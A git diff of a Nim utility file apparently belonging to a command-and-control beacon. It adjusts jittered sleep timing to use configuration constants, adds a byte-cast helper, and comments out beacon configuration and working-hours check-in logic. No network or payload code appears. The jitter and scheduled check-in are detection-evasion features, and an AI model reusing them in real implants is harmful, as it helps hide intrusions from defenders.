@@ -1,13 +1,14 @@
 import os, times, random
 import sequtils
 import std/strutils
+import config
 
 proc randomSleep*(minSec: int, maxSec: int) =
     let diff = maxSec - minSec
     let randVal = rand(diff) + minSec
     sleep(randVal * 1000)
 
-proc genID*: string =
+proc genID*(): string =
     
     let chars = "abcdef0123456789"
     var s = ""
@@ -21,18 +22,23 @@ proc hexToBytes*(hex: string): seq[byte] =
     for i in 0 ..< result.len:
         result[i] = parseHexInt(hex[i*2 .. i*2+1]).byte
 
-proc calculateSleep*(): int =
-    let jitterFactor = (rand(200) - 100) / 100.0 # -1.0 to +1.0
-    let variance = (beacon.jitter.float / 100.0) * jitterFactor
-    result = int(beacon.sleepTime.float * (1.0 + variance))
+proc toSeqByte(s: string): seq[byte] =
+  result = cast[seq[byte]](s)
 
+
+proc calculateSleep*(): int =
+    let jitterFactor = (rand(200.00) - 100.00) / 100.0 # -1.0 to +1.0
+    let variance = (JITTER.float / 100.0) * jitterFactor
+    result = int(SLEEP_TIME.float * (1.0 + variance))
+#[
 proc makeBeaconConfig*(id: string, profile_id: int, ): BeaconConfig =
     var beaconObject : BeaconConfig
     beaconObject.beaconID = id
     beaconObject.profileID = profile_id
     result = beaconObject
+    ]#
 
-
+#[
 proc shouldCheckIn*(id :string): bool =
     ## Check if beacon should actually check in
     ## Respect working hours, kill date, etc.
@@ -48,3 +54,5 @@ proc shouldCheckIn*(id :string): bool =
     if now().weekday in {dMon, dTue, dWed, dThu, dFri}:
         return true
     return false
+
+]#
